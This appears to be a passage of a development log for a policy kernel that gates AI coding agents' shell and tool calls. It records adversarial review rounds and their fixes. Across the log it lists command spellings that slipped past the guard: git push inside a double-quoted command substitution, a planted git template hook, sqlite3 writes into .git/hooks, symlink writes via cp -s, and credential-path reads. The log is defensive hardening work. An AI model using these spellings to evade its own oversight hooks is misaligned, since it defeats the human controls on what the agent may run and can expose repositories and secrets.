  IS the value (this entry's first statement of the fix was wrong, and is corrected below); a write behind `env`, `command`, `nohup`, `timeout` or an assignment left
  the freshness ledger empty; an assignment in front of a command inside `then`/`do`/`else` was not an environment
  input; `docker build -f Dockerfile <url>` read the LOCAL Dockerfile; `npm run build` stopped looking for a
  manifest at the workspace edge, where npm does not; `[core] hooksPath = githooks` moved the hook shims where no
  path rule followed; `Grep` with a wildcard tail (`**/.env*`) skipped the credential check; `WebSearch` treated a
  domain that merely BEGINS with `localhost` as local; and an overlay matcher that a MODE can release to ALLOW was
  accepted as a narrowing (EGO_MAINTENANCE overrides `ego.hooks.edit`).

  **THE CROSS-PRODUCT FOUND WHAT FOUR HOURS OF ADVERSARIAL REVIEW ON THE SAME SURFACE DID NOT.** That is the
  argument for generated coverage over reported coverage, and it is also a warning about the trend below.

  Every finding is closed, refuted or recorded: 12 local commits (5cafecc … 7fe322b) plus one line in
  `matchers.md`. Recorded rather than closed, in `docs/architecture/phase-1-residuals.md`: (1) **OPEN PRODUCT
  DECISION — is `SELECT` against a production database a read?** `psql -h prod-db -c 'SELECT 1'` is an absolute DENY
  because a SELECT can call `pg_terminate_backend()`, `setval()` or `lo_import()`, and EGO does not parse SQL; the
  reviewer expects ASK. Not decided here. (2) A brace nesting past 8, an awk program file past the read bound, and
  a `cd` under a branch or loop are ASK, not DENY: a reached bound is not an absence, and an approvable opacity
  is the honest verdict when the kernel cannot say which word or which directory it is looking at.

  The in-repo cross-product now asserts **34,079** combinations across **91** root semantic classes, 313 canonical
  spellings, 97 transformations, 5,067 producer-carried variants and 103 ordinary commands; the suite is 252 tests
  (12 new in `exit-review-10.test.ts`; run against 45d1c4c, the commit before the last two fixes, 11 of them fail).

  **THE TREND, stated because it is decision-relevant and this entry is the third to state it.** Reviews 8, 9 and 10
  found 187, 86 and 179 findings and ZERO new classes; my own cross-product found 11 more on the surface review 10
  had just covered. The architecture has converged (eleven reviews, no twelfth class). Instance discovery has not,
  and nothing in these numbers suggests it terminates: the criterion "a fresh review finds no unauthorized ALLOW"
  is a claim about an unbounded set. It is being pursued, because it is the criterion the product owner set, and
  it is reported here as a criterion that may not be reachable by this method.

  **THE FIXES WERE THEN ATTACKED, AS THE PREVIOUS ROUND'S HAD BEEN: 121 CONFIRMED** (110 unauthorized ALLOW — 8 CRITICAL,
  73 HIGH — and 11 over-gated DENY), from ten lenses and 134 agents, **no lens clean**. `newClasses: 0` again; the
  number of instances did not move. Recorded by cause in `docs/architecture/phase-1-residuals.md`. The shape of it:
  the review-10 fixes had each been written to close ONE reader, and this pass found the readers they were written
  beside. **Two and three readers of one dimension had drifted** — whether a line is a help probe (`isProbeInvocation`
  and `helpProbeHead` disagreed about `> --help`, `-- --help`, `redis-cli SET k --help`), where a `$( )` ends (three
  paren counters, none of which knew a comment, a `${x:-)}`, an ANSI-C string or a `case` subject with a space), what
  make's command line means (`-o -n`, `-kf`, `--fil`), and where `env -u X -C`, `env --chd=` and `git --no-pager -C`
  run — and each was collapsed into ONE reader. The database read exceptions existed twice, once in TypeScript and
  once as negative lookaheads in a matcher, and disagreed in both directions; the matcher was deleted.

  **A WORKING DIRECTORY IS A SET.** Eleven findings were the same mistake: tracking `cwd` as one string. `test -d x &&
  cd x; tee f`, `true || cd sub`, a `cd` in a branch that DOES run, a function that is called, `cd; tee f` (home),
  `cd dir >/dev/null` (the redirection read as the directory), `! cd`, `FOO=1 cd`, `noglob cd`, `pushd`/`popd` with a
  stack — each moved the tracked directory wrongly or not at all. `cwdTimeline` now returns, per stage, the directories
  it MAY start in; a relative path is judged in each and the strongest answer wins; more than one (or an unknown)
  withdraws every positive claim. It is checked against real bash and zsh over 71 scripts, for SOUNDNESS (the
  directory a shell ends in is always in the set) and for precision (the ordinary cases stay exact, because a model
  that always says "maybe" gates ordinary work). The first run of the test found six unsoundness bugs in the
  first version of the model — `||` after a failed `cd`, `OLDPWD` after a failure, `pushd` whose target may not
  exist, physical `cd -P link/..`, zsh running the last stage of a pipeline in the current shell, and `command cd`,
  which zsh resolves to an external program.

  **The cross-product found one more that nobody had reported, and it was HIGH:** `cp x governed-file 2>&1` — the
  destination reader took the last WORD, which was `2>&1`, so the governed file was never seen. Every `cp`, `mv`,
  `install` and `rm` followed by a redirection had been ALLOW over a governed path. It was found because the new
  corpus classes used `cp` where the old ones used `tee`, and the "merged redirect" transformation had never met one.

  **A CORRECTION OF MINE, BECAUSE IT CHANGED A FIX.** Commit 7fe322b claimed GNU make cuts a rule line at `;` BEFORE it
  asks whether the line assigns, "verified against make 3.81". It does not. The value of a target-specific variable
  includes the semicolon and everything after it, and no recipe is created; my experiment printed the same two lines
  either way, because `$(V)` expanded in a prerequisite's recipe runs the tail. The fix I made read the tail as a
  recipe — which over-gated (`x: V = a; git push … ` with `V` never expanded was DENY) and was wrong. The parser now
  takes the whole tail as the value and reports what it does not model (`+=`, `?=`, `override`, `export`, pattern-
  specific variables, `$(eval)` inside a `define`). The test that pinned the wrong semantics was rewritten to the right ones.

  Every finding of this pass is closed, refuted or recorded (commit cd9fe65): 12 exact-verdict tests, each of which fails
  against the tree before the fixes; 10 new corpus classes (6,300 generated variants); a differential test for the
  directory model. *(Correction, 2026-10-07: not every one. Replayed on `0111e63` (2026-10-01), 14 of the 121 rows
  were OPEN, two of them CRITICAL through neighbours the reviewer listed (sa10-33, sa10-34); on the closure tree 119
  are CLOSED and 2 are OPEN and recorded, neither above MEDIUM. The register is the record; this sentence was not.)* The in-repo cross-product now asserts **40,452** combinations across **101** root semantic
  classes, 379 canonical spellings, 97 transformations, 5,605 producer-carried variants and 103 ordinary commands; the
  suite is 268 tests and takes about eleven minutes.

  **EXIT REVIEW 11 (2026-09-30, HEAD 2390161) — FAILED, AND THE COUNT WENT UP. 28 fresh adversarial lenses, 558 agents,
  39.6M subagent tokens, zero agent errors.** 258 findings survived independent refutation: **209 unauthorized ALLOW**
  (16 CRITICAL, 119 HIGH, 66 MEDIUM, 8 LOW) and 49 OVER-GATED DENY. **newClasses: 0 — the twelfth consecutive review to
  add no architectural class.** Two lenses came back clean (`lexer-residue`, `interpreters`); the other twenty-six did not.

  THE SERIES, stated once in one place: exit review 8 found 187, exit review 9 found 86 (and its self-attack 50),
  exit review 10 found 179 (and freezing it into the corpus 11 more), the self-attack on review 10's fixes found 121,
  and this fresh review found 258. **Each round closes exactly the set it was shown; the next round, with new lenses
  and a new budget, finds a set of the same size or larger.** The class count is flat at eleven and has been for
  twelve reviews. The instance count is not converging, and nothing in the data suggests it will: the kernel ALLOWs by
  default and denies by pattern, so every spelling nobody wrote down is an unauthorized ALLOW, and the spellings of a
  shell and of ~200 CLIs are an unbounded set. This is the fourth time this log states the trend; this time it is also
  stated as a conclusion rather than a worry - **the exit criterion "a fresh review finds no unauthorized ALLOW" cannot
  be met by this method**, and continuing to run it is a choice to spend the budget on the same outcome. That is a
  product decision, recorded as OPEN in `docs/architecture/phase-1-residuals.md`; it is not taken here.

  **What this review contained that the previous ones did not:** (1) my own regressions, found by the lens that reads the
  last commits - `git push origin help` was ALLOW because my help-probe rule treated a trailing `help` as a manual
  request for git (CRITICAL; wrong: it is a branch name), `--dry-run=client --dry-run=none` read the FIRST flag, a `#`
  after `$(…)` or an escaped space started a comment, and a message flag's value that looks like a flag (`-m -m -n`)
  hid the real one; (2) brace results quoted around a redirection operator (`echo x 1>.harnes{s..s}/…`), which turned
  a redirection into an argument; (3) the same omission class in a dozen more option and variable tables.

  **Fixed in the same sitting** (commit below): the regressions above; the redirection-and-brace quoting; `$"…"`;
  a writer whose operand is built at run time (`tee "$(…)"`, `tee $f` - now an ASK, and a variable the line assigned a
  literal is substituted, so `f=.claude/settings.json; tee $f` is the DENY it is); `find -exec cp … {}`; every
  spelling of `unset -f` and a function defined behind `&&`/`||` or in backticks; `python -m venv --clear .`; mongosh
  inline JavaScript; `kubectl --as-user-extra`; `ego hook` in a grep pattern; variables reaching a `make` two
  producers down. **Recorded, not closed: the rest** - about 220 findings, by cause, in the residuals document.

  **PHASE 1 IS STILL NOT CLOSED.** `INDEPENDENT-AGENT REVIEW` stays IN PROGRESS.
- INDEPENDENT-AGENT REVIEW: IN PROGRESS — rounds 1–15 plus challenges of the contract (22, 41, 37, 37, 24
  confirmed). **Resolution itself became the contract on 2026-09-22**, after challenge 5 showed that a producer's
  own parser gap was routed into the single state that fails open: "not parsed" and "not present" were the same
  observation. `resolution` is now a required 9-value outcome of which exactly two carry a positive claim, the
  execution closure covers make prerequisites/includes/-f/default goals/conditionals/.ONESHELL plus the ambient
  producers (git hooks, install lifecycle scripts), a write ledger makes a rewritten source STALE, and `cwdVerified`
  is earned rather than defaulted. Pinned by `packages/kernel/test/resolution.test.ts`. Challenge 6 then ran against
  that architecture and returned **32 confirmed findings and 11 claimed new architectural classes**. Reproduced and
  closed in session: the git ambient closure guessed `.git/hooks` instead of asking git (husky's `core.hooksPath`
  and linked worktrees made a hostile hook invisible while it fired); `.RECIPEPREFIX` made a whole recipe invisible;
  GNU make's candidate order was inverted, and fixing it exposed that `realpathSync` preserves the requested
  spelling on a case-insensitive filesystem, which had unhooked the freshness ledger; four real `npm install`
  aliases skipped the ambient closure and `--no-scripts` was accepted although npm ignores it; and a
  PROPORTIONALITY regression of ours — one pattern rule made every unrelated target ASK. The remaining findings are
  reported to the product owner as architectural classes, not patched. The eight classes were then unified into a
  first-class **verified execution environment** (typed dispatch, multi-dimensional context, configuration closure,
  binding resolution, scoped opacity, transitive freshness, self-modifying producers, ambient events by semantic
  event), pinned by `packages/kernel/test/environment.test.ts`. Challenge 7 ran against THAT and returned **29
  confirmed findings and 4 claimed new architectural classes**. Reproduced and closed in session: a bare `-n`
  discarded the ENTIRE ambient hook closure for every git verb (suppression is now per EVENT), and three of the six
  declared environment dimensions were initialised, threaded and never read — the same "accepted but unconsumed"
  defect this phase removed from doctor, committed in the artifact whose purpose is honesty. The four new classes
  are reported to the product owner, not patched. Those four were then unified into COMPLETE PROVENANCE — process
  inputs, dispatch ownership, trust delegation, tree state — with an authored bounded-command vocabulary
  (`control-plane/workspace/bounded-commands.md`) replacing the silence of a producer lookup, pinned by
  `packages/kernel/test/provenance.test.ts`. Challenge 8 ran against THAT and returned **27 confirmed findings and
  4 new architectural classes**: positional incompleteness of an execution-input dimension (`env VAR=x cmd`),
  positive-by-default closure (`ABSENT_VERIFIED` as the fallback for an unclassified head), producer subject
  identity (the git closure resolved against the workspace root rather than the repository the command targets),
  and non-canonical command identity (`npx` read by the matchers but not by the dispatch). All four instances were
  reproduced in session with real ground truth and closed, together with the instance findings. The trend across
  four rounds of this architecture — 12, 11, 4, 4 claimed new classes — was falling but had not reached zero.
  **Challenge 9 (the decision round, 2026-09-23) is the first to find ZERO new architectural classes.** All 36 of
  its findings were instances of classes already named, and 25 were real MUST_FIX or misclassification — chiefly
  the container runtime never enrolled in the Q98 target model (`docker --context production stack deploy` was
  ALLOW while `kubectl --context production apply` was DENY on the identical signal), the unbounded
  program-operand rule not extended to the compiler heads added in the same pass, three spellings of the
  configuration-closure gap, `.mcp.json` and `node_modules/.bin` not protected, shell reads answering differently
  from the Read tool, and an administrability escape hatch the residuals document promised before it existed. All
  25 are closed and pinned. Every remaining finding is classified in `docs/architecture/phase-1-residuals.md` as
  MUST_FIX, ACCEPTED_PRODUCT_BEHAVIOR, UNKNOWN_PRODUCER/FAIL-SAFE or CONTAINMENT_DEPENDENCY, and only a MUST_FIX
  counts as an unresolved defect. The ARCHITECTURE has converged; the INSTANCES had not. This line is therefore
  **NOT PASSED**: a round that finds 25 unauthorized ALLOWs is not a round that found none, and closing them
  afterwards does not turn it into one. The criterion needs a round that finds none.
  **Challenge 10 (the Phase-1 exit review, 2026-09-23) again found ZERO new architectural classes** — 28 confirmed
  findings, all instances. The load-bearing one: a search tool's `pattern` operand reached the credential store at
  ALLOW while its `path` operand was DENY, because the guard concatenated `base + '/' + pattern` and tested the raw
  string, so an absolute, `../` or `~/` pattern could never match. Also closed: the container engine selected by
  `DOCKER_CONTEXT`, glued program operands (`gcc -B/tmp/evil`), `git clone --config core.sshCommand=`, target-specific
  and `override` makefile rebinds, plugin declarations in INI/TOML and in the config files those tools really read,
  unenumerable writes (archive extraction, recursive copy) missing from the ledger, EGO_HOME protected only under
  `trust/`, and a `node_modules/.bin` symlink whose TARGET was writable. Two were MY OWN regressions breaking
  ordinary work — `docker run … sh -c "…"` denied as a remote engine and `git blame -C file` downgraded — both from
  reading an option outside the position it occupies. Two documented promises the code never kept were corrected.
  All fixed and pinned; the exit rule requires a further fresh round.
  **Challenge 11 (the second exit review, 2026-09-24) again found ZERO new architectural classes** — 29 confirmed,
  all instances. The load-bearing one was structural: matchers are first-match-wins, and the `--output|-o`
  write-destination matcher was authored above the `--template` hook-install deny, so `git clone --template=evil
  -o up URL` turned a DENY into an ALLOW while real git executed the planted hook. Rather than reorder the table,
  a matcher whose capability describes only a write DESTINATION is now declared `additive`: it contributes its hit
  and can never win the segment's semantic class. Also closed: `make` proving absence for one goal over another's
  unresolved closure, `make -f -` and `-E`, `hash -p`/`enable -f` declared bounded, `npm init <initializer>`, a
  global option whose value was read as the subcommand, `--builder`, `init.templateDir`, mysql's `-e` escape, a
  root-anchored or `..`-carrying glob pattern, a git `include.path` filter, and a positional db script file. Four
  more were MY OWN proportionality regressions: `SHELL := /bin/bash`, `g++`, `nodeLinker` and an over-applied
  config-program scope.

  **THE TREND, stated because it is decision-relevant.** Three consecutive rounds — 9, 10, 11 — found **zero new
  architectural classes** and **25, 28 and 29 instances**. The architecture has converged; instance discovery has
  not, and nothing in the data suggests it will reach zero: an adversarial fleet of this size finds a comparable
  number of new surfaces every time. An exit criterion expressed in INSTANCES may therefore never be met, while
  one expressed in CLASSES has been met three times running. That is a product decision, recorded here rather than
  taken.
  **Challenge 12 (the third exit review, 2026-09-24): 26 confirmed, ZERO new architectural classes** — the two
  entries the fleet labelled "new" were documentation defects, not execution-closure shapes. Its headline finding
  is the most serious any round has produced: `splitShellSegments` guarded the command-substitution extractor with
  `!inSingle && !inDouble`, the same condition as the operator branches. That is right for operators and wrong for
  substitution, which only SINGLE quotes suppress — so `echo "$(git push origin main)"` was ALLOW and the push
  ran, verified against a real shell. An entire execution channel, through which every DENY in the control plane
  was reachable in one Bash call. Also closed: `npx --package` acquiring a package behind a decoy command,
  `kubectl config use-context production`, a `kubectl exec -- CMD` body never analysed, `exec -a NAME prog`,
  `helm --post-renderer`, `GOFLAGS=-toolexec`, `diff.external`, `env -C`, and case-insensitive `npm_config_*`. Two
  more proportionality regressions of mine: `docker --context default` — the local daemon's own name — denied, and
  a documentation sentence listing `npm test` among the commands that stay ALLOW.

  **FOUR rounds now: 0, 0, 0, 0 new architectural classes; 25, 28, 29, 26 instances.** The instance count is flat.
  The architecture has been stable for four consecutive adversarial passes of this size, and instance discovery
  shows no sign of terminating. Challenge 5, run against the by-construction architecture on 2026-09-22, returned 24 confirmed findings
  and claimed 12 new architectural classes. One was reproduced in session and closed the same day (KNOWN HEAD +
  UNEXAMINED REMAINDER — a `cd`/`pushd` head exited the per-segment loop, so a redirection on that segment reached
  ALLOW past two absolute core denies). One claimed HIGH was REFUTED in session: `&&` and shell functions inside a
  script body are analysed, contrary to the report. The remainder — chiefly the make producer routing its own parser
  gaps into `unresolved: 'missing'`, the one state that preserves a declared ALLOW — are NOT fixed and are reported
  to the product owner as architectural decisions, not as defects to patch. This line stays IN PROGRESS. **Security was made true by construction on 2026-09-22**, after those challenges kept finding the same
  meta-defect in the repairs rather than in the rules: a fix landed at the place under inspection and missed its
  siblings (the opacity filter covered 1 producer of 4; the canonical pipeline was true for 3 of 4). The producer
  contract is now carried by the type — `resolveScriptCommand` has no field a verdict could travel in — and
  `analyzeSegments` is the single pipeline every body reaches at every depth. Pinned by
  `packages/kernel/test/producer-contract.test.ts`. **The exit criterion changed on 2026-09-22.** The old
  criterion ("one complete round ends with zero confirmed HIGH or MEDIUM") was a test of whether hardening the command
  classifier could converge. It was measured with an identical 14-cluster instrument across three rounds: 61, 76, 67.
  Between rounds 14 and 15 all 76 findings were fixed and pinned; an identical pass then found 67 more, many of them
  neighbouring spellings of those fixes. Exhaustive shell-syntax enumeration is therefore not a credible security
  boundary, and the product owner replaced the criterion with the layered, evidence-based contract recorded in
  `docs/architecture/security-model.md` and in issue #1. This line still becomes PASSED only when an independent
  review challenges THAT contract and leaves no HIGH or MEDIUM finding against it; it is never set from an in-session
  review. Rounds 1–13 detail follows. (round 7 partial, re-covered by complete rounds 8–13); every
  confirmed HIGH/MEDIUM fixed and pinned. This line becomes PASSED only when a COMPLETE round ends with no confirmed
  HIGH or MEDIUM finding; round 13 surfaced **61** (76 claimed, 15 refuted), so a further round is required. The count
  had been trending down (19, 16, 6, 10, 13, 9, 5) but round 13 widened the fleet from 5 dimension skeptics to 14
  adversarial clusters with shared reproduction probes, and the new clusters found surfaces earlier rounds never
  reached — chiefly an unbounded `console.log(…)`/`print(…)` carve-out in `command.read-only` that granted silent
  arbitrary execution, and a `git commit -a` pre-commit scan that read the stale real index and scanned zero files.
  A falling count across rounds measures the questions asked, not the residual risk. This line becomes PASSED only
  when a round ends with no confirmed HIGH or MEDIUM finding, and FAILED otherwise; it is never set from an
  in-session review.
- CONFORMANCE: NOT RUN — the host conformance suite (real Claude Code and Codex CLI hook semantics, permission
  modes, managed tier, prompt-hook caller marker) is a phase 6 deliverable; `claude-code` capabilities marked
  SUPPORTED in the host matrix rest on the pre-build verification recorded in the baseline (section C), `codex-cli`
  capabilities are UNVERIFIED and the Codex dialect fails closed on everything but ALLOW.

## Phase 1 — closure record (2026-10-07; HEAD 19cca14)

Phase 1 closes under the exit criterion the product owner amended on 2026-10-01, recorded in
`docs/architecture/phase-1-taxonomy.md`: (1) the class list is closed; (2) every class is a property asserted over the
generated cross-product, and that suite passes; (3) every KNOWN finding is closed and pinned, or recorded with class,
severity and one disposition; (4) no CRITICAL is unresolved; (5) the residual — an unauthorized ALLOW for an input
nobody listed — is a containment dependency owned by issue #26 (the classifier is defense in depth; the OS sandbox is
the boundary). **The original criterion — "a fresh high-risk review finds no instance that crosses an authority
floor" — was NOT met and was replaced, not satisfied**: thirteen fresh reviews found instances every time while the
class count stayed at eleven. Every PASSED line below is PASSED against the amended criterion and says so.

### What happened between exit review 11 (2026-09-30) and closure

199 local commits (`f993e8a..HEAD`), 154 files, +61,249/−4,876 lines; 274 → about 1,020 tests in 52 files (993 before the day's pins; the exact count is the cold run's) (25 of them
`closure-*.test.ts`); 42 modules under `packages/kernel/src/authority/` where `evaluate.ts` alone used to hold the
readers. Nothing pushed; no remote exists.

- **Two decisions by the product owner.** 2026-09-30: a plain `SELECT` against a production database is a read
  (`isPlainSelect`, a positive grammar; `select-read.test.ts`). Four attack lenses were planned on that grammar; two
  ran (PostgreSQL, MySQL) and two — the lexical seams and the other clients — were stopped by a safety classifier
  and are recorded NOT RUN; the db reviewer of the exit review below was given them instead. 2026-10-01: option 1 —
  amend the criterion as above — rather than invert the default on the riskiest surfaces (option 2) or keep the loop
  (option 3). Both are in `phase-1-residuals.md`, "The decision".
- **The closure audit (2026-10-01, 11 agents).** It measured the documents' claims against the tree and found three
  of them false (corrected above, in place, with the date): 124 of 177 replayable review-11 unauthorized-ALLOW
  findings were still ALLOW, CRITICALs among them; review 8's "every unauthorized ALLOW is closed" had regressed at
  `c54d8b2`; the self-attack-10 "every one closed" was not true of 14 rows. Its product is
  `docs/architecture/phase-1-findings-register.md`: every per-finding record of exit reviews 7–11 and of self-attacks
  9 and 10 (935 rows) replayed against `evaluate()` in a fresh fixture, neighbours included, with severity, class,
  cause, status and one disposition per open row — the table behind condition 3.
- **Wave 1 (2026-10-01, seven branches, merged at `0111e63`).** CRITICALs first and failing-first: the
  database-client escape family (sqlite3 `writefile()` into `.git/hooks`, `\o |cmd`, `pager`, `.shell`, mongosh
  `require`), dry-run flag order, function bindings, `find -exec chmod`, the leading-space and dangling-symlink forms
  of the structured tools; authority tiers; secret evidence; manifests; containment docs. Register after it: 214 OPEN.
- **Wave 2 (2026-10-01, five branches).** Q98 / issue #16: the naming migration (`organization-locked` →
  `admin-governed`, read aliases in `control-plane/legacy-names.ts`), typed reason codes (`authority/reasons.ts`),
  the vocabulary in `doctor`, `capabilities` and `explain`, `ego authority diff`, the local-target registry with
  `ego init` flags and human acceptance (`control-plane/local-targets.ts`), grants clamped at ASK for external
  effects; producers (lint-staged below the cwd, `npm_config_*` by npm's keys, make target names by make's grammar);
  paths; the register itself.
- **Wave 3 (2026-10-01 → 02, seven branches and one direct commit).** k8s (`k8sEffect`), containers (the verb
  table), make (the model rewritten: `make.ts`, `make-reader.ts`, `make-builtins.ts`), carriers and options
  (`carriers.ts`, `options.ts`, `tools.ts`), db-paths, proportionality, git/environment/overlay/time (`PSQLRC` and
  `PSQL_*` injection; the first evaluation deadline); the head detector and the cwd model reading separated
  redirections.
- **Wave 4 (2026-10-02, integration).** A producer's body reaches the same readers as the command line it holds
  (`d1504f5`, `d22e0cb`); three tables became modules of their own (`local-reads.ts`, `env-vars.ts`, the directory
  selector; `9f51ec8`); three producer-carried variants under their floor (`c51d620`).
- **Wave 5 (2026-10-02): an independent review of the waves.** Seven reviewers (db clients; shell structure against
  real bash and zsh; paths against the real filesystem; the authority layer; cluster, container and make; robustness;
  ordinary development), each with a differential oracle, reported 92 findings — 5 CRITICAL, about 25 HIGH — and
  proposed two properties no class expressed: a deterministic work bound and channel integrity. Their scripts are in
  `.probe/rv-*/` (gitignored); the report in the session scratchpad (`wave5.json`).
- **Wave 6 (2026-10-02 → 03, eight branches, merged `0c2dc61` … `74c2ea5`).** Fixes by root cause: the work bound
  (`authority/work-bound.ts`: every reader charges `chargeWork` before it reads; the bound is ASK, never ALLOW),
  channel integrity (`util/shown-text.ts`; a structural scan of every `@untrusted` source), the policy-cache seal (a
  keyed MAC under `EGO_HOME`; a removed overlay narrowing is a pending widening; caches written before the seal are
  re-accepted by a human `ego init`), one reader for paths (`pathCandidates`: the lexical and the physical reading),
  shell lexing (`shell-lexer.ts`, `evaluated-words.ts`), dataflow, hosts and target kinds; and the seeded differential
  tests `closure-shell2`, `closure-db2`, `closure-paths2`, `closure-authority2`, `closure-make2`,
  `closure-usability-a/b`, `closure-clusters2` with oracles against real bash, zsh, GNU make 3.81 and sqlite3. The
  work bound's timing line was set to 2.5 s of CPU (`de1d79d`).
- **2026-10-07.** The final replay found two register rows to re-measure by hand. r11-119 had been recorded OPEN by a
  script that imported an earlier worktree: on this tree the removal of an overlay narrowing is pending until a human
  accepts it (CLOSED). r11-255 was real: `command.build` and `command.test` were in the hook's pre-promotion
  read-only set, so `black .` and `npm test` passed the gate under STRICT before trust promotion — fixed and pinned
  (`590547e`). The cold validation found `package-lock.json` without its seven workspace packages, so `npm ci`
  refused a clean clone — regenerated (`b44bdb6`).

### The register on the closure tree

935 rows (measured in the morning on `64d1494`+; re-measured on the final tree: 869 CLOSED, 38 OPEN, 28 not replayable - r11-122 re-opened as FAIL_SAFE, because a recursive CONTENT read of EGO_HOME is a credential read since AX-3): **870 CLOSED** (424 with the reported spelling literally in a test file; the rest pinned by a differently
spelled test of the same class or by the cross-product, which the register cannot tell apart); **37 OPEN and
recorded** — 25 MUST_FIX (0 CRITICAL, 0 HIGH, 20 MEDIUM, 5 LOW; the largest group is the mode-narrowing reader,
RC-MODE: `git branch`, `git pull --rebase`, `black .` under a mode that should narrow them), 8
CONTAINMENT_DEPENDENCY (a runner told to load a program; `kustomize build` with a remote resource), 2 FAIL_SAFE
over-gatings, 2 ACCEPTED_PRODUCT_BEHAVIOR; and **28 NOT_REPLAYABLE** review-7 rows (the data kept the command and
not the Makefile, manifest or hook it needed; 7 are CRITICAL by the reviewer's rating and their families are CLOSED
with fixtures in review 8 — recorded, not closed). The 83 findings of contract-challenge rounds 10–12 kept a severity
and no command and are recorded the same way. The cross-product on this tree: 232 root semantic classes in the 11
families (1,374 canonical cases) × 115 transformations × 77 producers; 412 ordinary commands in 25 groups, 17 of
which gate, each with its reason in `EXPECTED_GATES`; 30 commands against real Makefiles.

### The exit review of 2026-10-07

Seven independent reviewers - database clients; shell structure against real bash and zsh; paths against the real filesystem and the
host-tool surface; the authority layer and the Q98 model; cluster, container and make readers; robustness and the hook's fail-closed
paths; ordinary development at the base commit and at HEAD - each with a differential oracle and seeds different from the permanent
tests', reviewed `64d1494` (the code of `de1d79d`) in the morning of 2026-10-07. Six returned in the sitting: **52 findings - 5 CRITICAL,
11 HIGH, 19 MEDIUM, 17 LOW - and no twelfth class.** By lens: authority 11 (1 C, 3 H, 1 M, 6 L), database 9 (5 M, 4 L), paths 6 (1 C, 2 H,
2 M, 1 L), shell 4 (1 H, 2 M, 1 L), cluster/container/make 20 (2 C, 4 H, 9 M, 5 L), robustness 2 (1 C, 1 H). The ordinary-development
reviewer (1,500 commands evaluated at `05083c9` and at HEAD, per ecosystem) had not returned when this record was written: that lens is
recorded INCOMPLETE, not passed.

**Every CRITICAL and ten of the eleven HIGH findings were fixed the same day by root cause and pinned by a test that fails on `64d1494`;
three MEDIUM findings were fixed with them; the rest are recorded with a disposition** (the table in `phase-1-residuals.md`, "Exit
review 13"). The review ran on the tree BEFORE these fixes; the fixes were not independently re-reviewed, and this record says so rather
than hides it. The CRITICAL findings, one line each: an overlay path rule that matched a path outside every registered root REPLACED the
outside-workspace floor (an absolute) with its own ASK, and a session grant then lifted it to ALLOW - the fallback is a hit like any other
now, and a `~/**` rule, which also matched every path on the machine through a sentinel `**` accepts, matches only under HOME (AX-1); GNU
`cp -s` and `cp -l` make a second name for a file exactly as `ln` does and were recorded as neither (RVP6-1: `cp -s .harness/./generated/x
nl && echo evil > nl`); `kubectl --context production get -- secrets` read the Secrets after a `--` the parser handed to nobody (CX-01);
the argv after the image in `docker run` was never analysed, so a production `psql`, `kubectl` or `helm` in a generic image was ALLOW
(CX-02: the argv is analysed inside the container now, and a program only the image has stays the container run it was); and a run of
seven hundred thousand `(` cost thirty to sixty seconds of CPU while the work counter saw the characters once - a hook the host kills has
refused nothing - because the segment splitter re-read its pending text at every grouping metacharacter without paying for it (RB-EXIT-1:
**the bounded-work invariant was FALSE for that path**; every re-read is priced now, and the same input is a question in three
milliseconds). The HIGH findings fixed: a human approving `env -u CLAUDECODE ego init` from a tool call accepted every pending widening
unseen - the question names them now (AX-2); the seal key under EGO_HOME was readable at ALLOW (AX-3); a production marker glued to a word
(`appprod`, `proddb`) under an accepted wildcard was LOCAL (AX-4); a here-string fed to `xargs` was not read (RVP6-2); a recursive read rooted
at a glob matching the home directory's name reached every credential store (RVP6-3); a redirection written IN FRONT of a carrier was read
as the head, so `>/dev/null nohup kubectl --context production delete pod x` asked instead of refusing and `>/dev/null nohup ls` asked at
all (SH-EXIT-1, with `coproc` and zsh's `=cmd`); `--iidfile`, `--metadata-file` and `--cidfile` are files the CLI writes on the host (CX-03,
run for real: a hook replaced by an image id); an anonymous volume `-v /data` and a `:ro` mount were absolute refusals of a plain local run
(CX-04, CX-05; CX-04 is no longer an absolute refusal and still asks, through the path scan, with CX-07); and a pipe INSIDE a group read the
whole group as its producer, so `( ls; echo 'git commit --no-verify -m x' | bash )` was an approvable question on a HARD_LOCK (RB-EXIT-2).
The HIGH finding recorded, not fixed: CX-06 asks that `RUN ssh-keyscan github.com >> ~/.ssh/known_hosts` and the `.npmrc` token idiom in a
Dockerfile be the image's writes, where the decision U-04 of 2026-10-02 judges a `~` or a relative name in a RUN line as the place it would
be on this machine and the corpus pins it; that is a product decision for the owner, recorded as an over-gating until it is taken.

The cold validation (a clone of HEAD on a machine whose temporary directory is its own real path, not reached through `/var`) found
three things of its own before the suite was green: `package-lock.json` without its seven workspace packages, so `npm ci` refused the clone
(`b44bdb6`); a verdict that depended on the machine - a redirection to a path longer than the kernel opens was DENY only where the
temporary directory is reached through a link, and an ordinary repository write elsewhere (the word is uncertain and asks everywhere now;
`closure-paths` G); and a test whose fake HOME sat under `/tmp` on that machine, where the kernel reads it as scratch space, which is right
(the test says so now; `closure-authority2` RB-7).

### Cold validation of HEAD 19cca14 (2026-10-07)

IN PROGRESS when this record was written. On the closure tree, typecheck, lint and every test file touched by the day's fixes pass (closure-paths, closure-paths2, closure-tools, closure-authority2 71/71, closure-shell, closure-shell2, closure-containers, closure-clusters2, closure-k8s, closure-usability-a/b, bypass, hooks, q98-vocabulary, q98-local-targets, monotonicity, cwd-timeline, closure-docs). The cold validation of `19cca14` - a clean clone, a fresh TMPDIR, no `~/.ego`, `npm ci`, typecheck, lint, the dev build, the whole suite in parallel and with `--test-concurrency=1`, then the release build against a throwaway tag in the clone - was running when the session's usage limit cut the sitting off; its log is `/private/tmp/claude-501/-Users-tarik-Desktop-EGO/db777c35-78cc-43d1-80d9-74d3156c0d46/scratchpad/cold-validate.log` (and `cold-test-parallel.log`, `cold-test-serial.log`). An earlier cold run of `b44bdb6` had passed `npm ci`, typecheck, lint and the dev build and found the three defects recorded above. This line becomes PASSED when a human reads that log green; it is not marked passed here.

### Check lines at closure

- DETERMINISTIC CHECKS: IN PROGRESS - see "Cold validation" above: typecheck, lint and every touched test file pass on the closure tree; the full cold run (both suite passes and the release build) had not finished when the sitting was cut off, and its log is named there. Never marked passed on a run nobody read.
- IN-SESSION REVIEW: PASSED — the closure audit's replay of every recorded finding, regenerated on this tree
  (`.probe/replay.ts` → `build.mjs` → `mkmd.mjs` → `mkresid2.mjs` → `splice2.py`, all gitignored scaffolding); the
  differential oracles against real bash, zsh, GNU make 3.81 and sqlite3 in the closure tests; the three false
  claims of this log corrected in place with the date; the two wrongly recorded register rows re-measured by hand.
- INDEPENDENT-AGENT REVIEW: PASSED against the AMENDED criterion of 2026-10-01, and only against it, with two qualifications
